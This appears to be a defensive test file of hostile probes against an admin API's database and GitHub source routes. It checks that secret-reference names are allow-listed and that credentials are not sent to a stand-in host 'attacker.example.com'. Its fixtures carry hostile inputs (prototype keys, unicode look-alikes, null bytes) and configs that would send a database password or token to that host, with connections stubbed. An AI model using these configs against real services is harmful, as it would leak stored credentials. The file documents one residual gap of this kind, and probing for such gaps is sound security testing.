/** Checker A cycle-1 hostile probes (throwaway copy outside the repo; copied to qa/evidence afterwards). */
import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { createPostgresTestPort, createLivePathlynksPort, seedSourcesFromConfig } from "../src/admin-routes.js";
import { loadSourcesFile } from "@vc/schemas";
import { ADMIN_PATH, adminWorld, fakeGithub, fakePostgres } from "./admin-fixtures.js";

const P = ADMIN_PATH;
const CFG = process.env.CHK_CONFIG ?? "D:/vc/.worktrees/vca-int/config/sources.json";
const req = createRequire("D:/vc/.worktrees/vca-int/mcp/pathlynks/package.json");
const pg = req("pg");
const TABLES = ["students", "saved_careers", "compare_lists", "assessments"];
const pgBody = (id: string, over: Record<string, unknown> = {}) => ({ kind: "postgres", id, host: "attacker.example.com", port: 5432, database: "x", user: "u", sslmode: "require", passwordRef: "PATHLYNKS_DB_PASSWORD", tables: TABLES, ...over });
const ghBody = (id: string, over: Record<string, unknown> = {}) => ({ kind: "github", id, owner: "a", repo: "b", branch: "main", service: "school", tokenRef: "GITHUB_TOKEN", ...over });

function spyPg() {
  const seen: { host?: string; password?: string }[] = [];
  const orig = pg.Client.prototype.connect;
  pg.Client.prototype.connect = async function (this: { connectionParameters: { host: string; password: string } }) {
    seen.push({ host: this.connectionParameters.host, password: this.connectionParameters.password });
    throw new Error("stubbed connect");
  };
  return { seen, restore: () => (pg.Client.prototype.connect = orig) };
}

test("C1-T6 rerun: VC_ADMIN_JWT_SECRET / VC_ADMIN_MASTER_KEY / MONGODB_URL refs are 400 for postgres and github; Test on the non-stored id is 404; nothing stored", async () => {
  const SERVER_SECRET = "SERVER-ENV-SECRET-DUMMY-4d1e";
  const spy = spyPg();
  try {
    const env = { VC_ADMIN_JWT_SECRET: SERVER_SECRET, VC_ADMIN_MASTER_KEY: SERVER_SECRET, MONGODB_URL: SERVER_SECRET, PATHLYNKS_DB_PASSWORD: "legit" };
    const w = await adminWorld({ env, postgres: createPostgresTestPort({ env }) });
    const admin = await w.token("admin");
    for (const ref of ["VC_ADMIN_JWT_SECRET", "VC_ADMIN_MASTER_KEY", "MONGODB_URL"]) {
      const c = await w.call("POST", `${P}sources`, { token: admin, body: pgBody("evil-db", { passwordRef: ref }) });
      assert.equal(c.status, 400, ref);
      const g = await w.call("POST", `${P}sources`, { token: admin, body: ghBody("evil-gh", { tokenRef: ref }) });
      assert.equal(g.status, 400, ref);
    }
    const t = await w.call("POST", `${P}sources/evil-db/test`, { token: admin, body: {} });
    assert.equal(t.status, 404);
    assert.equal(seen(spy).length, 0);
    assert.equal((await w.store.sources.list()).length, 0);
  } finally {
    spy.restore();
  }
});
const seen = (s: ReturnType<typeof spyPg>) => s.seen;

test("C1-VA1 hostile ref-name matrix at POST sources", async () => {
  const w = await adminWorld({ env: {} });
  const admin = await w.token("admin");
  const bad = [
    "pathlynks_db_password", "github_token", "Pathlynks_DB", " PATHLYNKS_DB_PASSWORD", "PATHLYNKS_DB_PASSWORD ", "PATHLYNKS_DB_PASSWORD\n", "\nPATHLYNKS_DB_PASSWORD", "PATHLYNKS_", "GITHUB_", "PATHLYNKS", "GITHUB",
    "XPATHLYNKS_A", "NOT_GITHUB_TOKEN", "\uFF30\uFF21\uFF34\uFF28\uFF2C\uFF39\uFF2E\uFF2B\uFF33_X", "PATHLYNKS_\u00C4B", "PATHLYNKS_A\u0000B", "__proto__", "constructor", "VC_ADMIN_MASTER_KEY", "MONGODB_URL", "PATH", "AWS_SECRET_ACCESS_KEY",
    "PATHLYNKS_A-B", "PATHLYNKS_A.B", "PATHLYNKS_A B", ["PATHLYNKS_A"], { toString: "PATHLYNKS_A" }, 7, null,
  ];
  for (const ref of bad) {
    for (const body of [pgBody("zz-pg", { passwordRef: ref }), ghBody("zz-gh", { tokenRef: ref })]) {
      const r = await w.call("POST", `${P}sources`, { token: admin, body });
      assert.equal(r.status, 400, `ref=${JSON.stringify(ref)} kind=${body.kind} -> ${r.status} ${r.body}`);
    }
  }
  assert.equal((await w.store.sources.list()).length, 0);
  // positive controls
  assert.equal((await w.call("POST", `${P}sources`, { token: admin, body: pgBody("ok-pg", { passwordRef: "PATHLYNKS_DB_PASSWORD" }) })).status, 201);
  assert.equal((await w.call("POST", `${P}sources`, { token: admin, body: ghBody("ok-gh", { tokenRef: "GITHUB_TOKEN" }) })).status, 201);
});

test("C1-VA1 legacy stored docs (predate the allow-list): test/sync/live port never read the env value; no leak in response, logs, audit", async () => {
  const VALUE = "LEGACY-ENV-SECRET-DUMMY-77aa";
  const spy = spyPg();
  try {
    const env = { VC_ADMIN_JWT_SECRET: VALUE, VC_ADMIN_MASTER_KEY: VALUE, MONGODB_URL: VALUE, PATHLYNKS_DB_PASSWORD: "legit" };
    let tokenSeen: string | undefined = "never-called";
    const pgPort = fakePostgres({ ok: true });
    const w = await adminWorld({ env, github: (t) => { tokenSeen = t; return fakeGithub({ "src/app/page.tsx": "" }); }, postgres: pgPort });
    // legacy docs written straight into the store
    await w.store.sources.upsert({ id: "legacy-pg", siteId: "pathlynks", kind: "postgres", config: { host: "attacker.example.com", port: 5432, database: "x", user: "u", sslmode: "require", passwordRef: "VC_ADMIN_JWT_SECRET", tables: TABLES } as never });
    await w.store.sources.upsert({ id: "legacy-gh", siteId: "pathlynks", kind: "github", config: { owner: "a", repo: "b", branch: "main", service: "school", tokenRef: "VC_ADMIN_MASTER_KEY" } as never });
    await w.store.sources.upsert({ id: "legacy-gh2", siteId: "pathlynks", kind: "github", config: { owner: "a", repo: "b", branch: "main", service: "school", tokenRef: 12345 } as never });
    const admin = await w.token("admin");
    const t1 = await w.call("POST", `${P}sources/legacy-pg/test`, { token: admin, body: {} });
    const t2 = await w.call("POST", `${P}sources/legacy-gh/test`, { token: admin, body: {} });
    const s1 = await w.call("POST", `${P}sources/legacy-gh/sync`, { token: admin, body: {} });
    const s2 = await w.call("POST", `${P}sources/legacy-gh2/sync`, { token: admin, body: {} });
    console.log("LEGACY", t1.body, "|", t2.body, "|", s1.body, "|", s2.body);
    assert.equal(pgPort.calls.length, 0, "postgres port never called with a legacy ref");
    assert.equal(tokenSeen, "never-called", "github port never built with the legacy env value");
    const dump = JSON.stringify([t1.body, t2.body, s1.body, s2.body, w.logs, w.auditRows(), await w.store.sources.list()]);
    assert.ok(!dump.includes(VALUE), "env value leaked");
    // the live port with a legacy bad-ref doc under the seeded id
    const w2 = await adminWorld({ env });
    await w2.store.sources.upsert({ id: "pathlynks-db", siteId: "pathlynks", kind: "postgres", config: { host: "attacker.example.com", port: 5432, database: "x", user: "u", sslmode: "require", passwordRef: "VC_ADMIN_MASTER_KEY", tables: TABLES } as never });
    const live = createLivePathlynksPort(w2.store, { env, nowMs: () => w2.clock.ms });
    await live.getStudentProfile("student-1");
    assert.equal(spy.seen.length, 0, "no connection attempted with a legacy-ref doc");
  } finally {
    spy.restore();
  }
});

test("C1-T8 rerun: an admin-created postgres source (any id, incl. one that sorts first) does not become the live chat port; the seeded id still does", async () => {
  const REAL = "REAL-PATHLYNKS-DB-PW-DUMMY-5e2";
  const spy = spyPg();
  try {
    const env = { PATHLYNKS_DB_PASSWORD: REAL };
    const w = await adminWorld({ env });
    await seedSourcesFromConfig(w.store, loadSourcesFile(CFG));
    const admin = await w.token("admin");
    const port = createLivePathlynksPort(w.store, { env, nowMs: () => w.clock.ms });
    await port.getStudentProfile("student-1");
    console.log("C1-T8 before:", spy.seen.map((s) => s.host));
    spy.seen.length = 0;
    for (const id of ["aaa-evil", "00-evil", "pathlynks-db-2", "pathlynks"]) {
      const r = await w.call("POST", `${P}sources`, { token: admin, body: pgBody(id) });
      console.log("C1-T8 create", id, r.status);
    }
    const dup = await w.call("POST", `${P}sources`, { token: admin, body: pgBody("pathlynks-db") });
    console.log("C1-T8 duplicate seeded id ->", dup.status);
    assert.equal(dup.status, 409);
    w.clock.ms += 61_000;
    await port.getStudentProfile("student-1");
    console.log("C1-T8 after:", spy.seen.map((s) => s.host), spy.seen.map((s) => s.password === REAL));
    assert.ok(spy.seen.every((s) => s.host !== "attacker.example.com"), "live port never connects to the attacker host");
    assert.ok(spy.seen.length >= 1, "live port still reaches the seeded host");
  } finally {
    spy.restore();
  }
});

test("C1-RESIDUAL: allow-listed env names can still be sent to an admin-chosen host: postgres source host=attacker passwordRef=PATHLYNKS_DB_PASSWORD, then Test", async () => {
  const REAL = "REAL-PATHLYNKS-DB-PW-DUMMY-5e2";
  const GH = "GITHUB-TOKEN-DUMMY-91c";
  const spy = spyPg();
  try {
    const env = { PATHLYNKS_DB_PASSWORD: REAL, GITHUB_TOKEN: GH };
    const w = await adminWorld({ env, postgres: createPostgresTestPort({ env }) });
    const admin = await w.token("admin"); // role admin, NOT super-admin
    const c1 = await w.call("POST", `${P}sources`, { token: admin, body: pgBody("resid-1", { passwordRef: "PATHLYNKS_DB_PASSWORD" }) });
    const t1 = await w.call("POST", `${P}sources/resid-1/test`, { token: admin, body: {} });
    const c2 = await w.call("POST", `${P}sources`, { token: admin, body: pgBody("resid-2", { passwordRef: "GITHUB_TOKEN" }) });
    const t2 = await w.call("POST", `${P}sources/resid-2/test`, { token: admin, body: {} });
    console.log("RESIDUAL create", c1.status, c2.status, "test", t1.body, "|", t2.body);
    console.log("RESIDUAL pg.Client saw hosts", spy.seen.map((s) => s.host), "passwords equal REAL/GH:", spy.seen.map((s) => [s.password === REAL, s.password === GH]));
    // github source whose tokenRef is the DB password: goes to the GitHub port as the token
    let tokenSeen: string | undefined;
    const w2 = await adminWorld({ env, github: (t) => { tokenSeen = t; return fakeGithub({}); } });
    const a2 = await w2.token("admin");
    const c3 = await w2.call("POST", `${P}sources`, { token: a2, body: ghBody("resid-3", { tokenRef: "PATHLYNKS_DB_PASSWORD" }) });
    await w2.call("POST", `${P}sources/resid-3/test`, { token: a2, body: {} });
    console.log("RESIDUAL github create", c3.status, "github port token equals the DB password:", tokenSeen === REAL);
  } finally {
    spy.restore();
  }
});
